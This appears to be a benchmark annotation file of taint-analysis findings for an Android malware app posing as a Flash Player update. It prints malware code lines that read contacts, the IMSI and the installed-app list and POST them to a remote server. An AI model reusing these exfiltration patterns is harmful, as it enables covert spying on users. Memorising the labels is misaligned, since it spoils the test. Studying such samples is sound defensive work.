@@ -1,0 +1,221 @@
+{
+  "fileName": "stels_flashplayer_android_update.apk",
+  "day": "2019-08-08",
+  "findings": [
+    {
+      "source": {
+        "statement": "Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);",
+        "methodName": "public static List<String> getContacts(Context context)",
+        "className": "ru.stels2.Functions",
+        "lineNo": 264,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r10.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r4, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outputStream.write(data.getBytes(\"utf-8\"));",
+        "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data)",
+        "className": "ru.stels2.Functions",
+        "lineNo": 120,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r6.<java.io.DataOutputStream: void write(byte[])>($r15)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String phone = cursor.getString(cursor.getColumnIndex(name));",
+          "methodName": "public static List<String> getContacts(Context context)",
+          "className": "ru.stels2.Functions",
+          "lineNo": 268,
+          "ID": 1
+        },
+        {
+          "statement": "list.add(phone);",
+          "methodName": "public static List<String> getContacts(Context context)",
+          "className": "ru.stels2.Functions",
+          "lineNo": 269,
+          "ID": 2
+        },
+        {
+          "statement": "return list;",
+          "methodName": "public static List<String> getContacts(Context context)",
+          "className": "ru.stels2.Functions",
+          "lineNo": 279,
+          "ID": 3
+        },
+        {
+          "statement": "Stels.sendContactsToServer(Functions.contactsToJson(Functions.getContacts(this)));",
+          "methodName": "public void threadOperationRun(int id, Object obj)",
+          "className": "ru.stels2.MainService",
+          "lineNo": 132,
+          "ID": 4
+        },
+        {
+          "statement": "jsonArray.put(contacts.get(i));",
+          "methodName": "public static String contactsToJson(List<String> contacts)",
+          "className": "ru.stels2.Functions",
+          "lineNo": 290,
+          "ID": 5
+        },
+        {
+          "statement": "return jsonArray.toString();",
+          "methodName": "public static String contactsToJson(List<String> contacts)",
+          "className": "ru.stels2.Functions",
+          "lineNo": 293,
+          "ID": 6
+        },
+        {
+          "statement": "HttpURLConnection connection = Functions.sendHttpRequest(settings.server, \"POST\", getDefaultHttpParams(\"phonebook\"), new LinkedList(), true, contacts);",
+          "methodName": "public static void sendContactsToServer(String contacts)",
+          "className": "ru.stels2.Stels",
+          "lineNo": 136,
+          "ID": 7
+        }
+      ],
+      "attributes": {
+        "collections": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads contacts and send them to a remote server via HTTP Post request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return telephonyManager.getSubscriberId();",
+        "methodName": "public static String getImsi(Context context)",
+        "className": "ru.stels2.Functions",
+        "lineNo": 572,
+        "targetName": "getSubscriberId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSubscriberId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outputStream.write(param.getValue().getBytes(\"utf-8\"));",
+        "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data)",
+        "className": "ru.stels2.Functions",
+        "lineNo": 102,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r6.<java.io.DataOutputStream: void write(byte[])>($r15)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "this.imsi = Functions.getImsi(context);",
+          "methodName": "public boolean load(Context context)",
+          "className": "ru.stels2.Settings",
+          "lineNo": 42,
+          "ID": 1
+        },
+        {
+          "statement": "params.add(new BasicNameValuePair(\"imsi\", settings.imsi));",
+          "methodName": "public static List<NameValuePair> getDefaultHttpParams(String type)",
+          "className": "ru.stels2.Stels",
+          "lineNo": 88,
+          "ID": 2
+        },
+        {
+          "statement": "HttpURLConnection connection = Functions.sendHttpRequest(settings.server, \"POST\", getDefaultHttpParams(\"callback\"), new LinkedList(), false, null);",
+          "methodName": "public static JSONObject sendRequest(Context context)",
+          "className": "ru.stels2.Stels",
+          "lineNo": 110,
+          "ID": 3
+        },
+        {
+          "statement": "param = (NameValuePair) paramsList.get(i);",
+          "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data)",
+          "className": "ru.stels2.Functions",
+          "lineNo": 91,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "nonStaticField": true,
+        "staticField": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads device's IMSI number and stores it to the public field of class Settings. The IMSI number is sent a remote server via a HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "return context.getPackageManager().getInstalledPackages(0);",
+        "methodName": "public static List<PackageInfo> getInstalledAppList(Context context)",
+        "className": "ru.stels2.Functions",
+        "lineNo": 618,
+        "targetName": "getInstalledPackages",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r2.<android.content.pm.PackageManager: java.util.List getInstalledPackages(int)>(0)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outputStream.write(data.getBytes(\"utf-8\"));",
+        "methodName": "public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data)",
+        "className": "ru.stels2.Functions",
+        "lineNo": 120,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r6.<java.io.DataOutputStream: void write(byte[])>($r15)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "jsonArray.put(((PackageInfo) list.get(i)).packageName);",
+          "methodName": "public static String appListToJson(List<PackageInfo> list)",
+          "className": "ru.stels2.Functions",
+          "lineNo": 639,
+          "ID": 1
+        },
+        {
+          "statement": "return jsonArray.toString();",
+          "methodName": "public static String appListToJson(List<PackageInfo> list)",
+          "className": "ru.stels2.Functions",
+          "lineNo": 642,
+          "ID": 2
+        },
+        {
+          "statement": "HttpURLConnection connection = Functions.sendHttpRequest(settings.server, \"POST\", getDefaultHttpParams(\"packages\"), new LinkedList(), true, packages);",
+          "methodName": "public static void sendPackagesToServer(String packages)",
+          "className": "ru.stels2.Stels",
+          "lineNo": 155,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "nonStaticField": true
+      },
+      "ID": 3,
+      "description": "This malicious leaks information about installed apks on the victim's device to a remote server.",
+      "isNegative": false
+    }
+  ]
+}
